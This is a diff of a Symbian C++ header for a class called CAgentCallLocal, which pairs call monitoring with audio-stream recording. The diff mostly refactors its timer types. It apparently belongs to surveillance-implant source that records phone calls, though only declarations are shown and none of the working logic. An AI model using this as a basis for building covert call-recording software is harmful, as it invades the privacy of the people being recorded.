@@ -14,7 +14,7 @@
 #include <MdaAudioInputStream.h>
 #include <mda\common\audio.h>
 #include <mmf\common\mmfutilities.h>
-#include <HT\TimeOutTimer.h>
+#include <HT\HighResTimeoutTimer.h>
 
 enum TRecordingState
 	{
@@ -28,7 +28,7 @@ enum TRecordingState
  *  CAgentCallLocal
  * 
  */
-class CAgentCallLocal : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MCallMonCallBack, public MTimeOutNotifier
+class CAgentCallLocal : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MCallMonCallBack, public MHighResTimeoutNotifier
 	{
 public:
 	// Constructors and destructor
@@ -53,7 +53,6 @@ protected:
 	// From AbstractQueueEndPoint
 	virtual void StartAgentCmdL();
 	virtual void StopAgentCmdL();
-	virtual void NotifyAgentCmdL(TUint32 aData);
 		
 private:
 	
@@ -75,8 +74,8 @@ private:
 	virtual void NotifyDisconnectedCallStatusL();
 	virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber);
 
-	// From MTimeOutNotifier
-	virtual void TimerExpiredL(TAny* src);
+	// From MHighResTimeoutNotifier
+	virtual void HighResTimerExpiredL(TAny* src);
 	    
 	/*
 	 * MaiscOpenComplete()
@@ -132,14 +131,15 @@ private:
 	TVoiceAdditionalData iVoiceAdditionalData;  
 	
 	// monitor drive space:
-	TBool  iBelowFreespaceQuota;
+	//TBool  iBelowFreespaceQuota;
 	
 	// monitor call:
 	CPhoneCallMonitor*	iCallMonitor;
 	TBool 				iInCall;
 	
 	// timeout timer for beep:
-	CTimeOutTimer* 	iTimer;
+	//CHighResTimeoutTimer* 	iTimer;
+	TTimeIntervalMicroSeconds32  iMicrosecInterval;
 	};
 
 #endif /* AGENTCALLLOCAL_H_ */
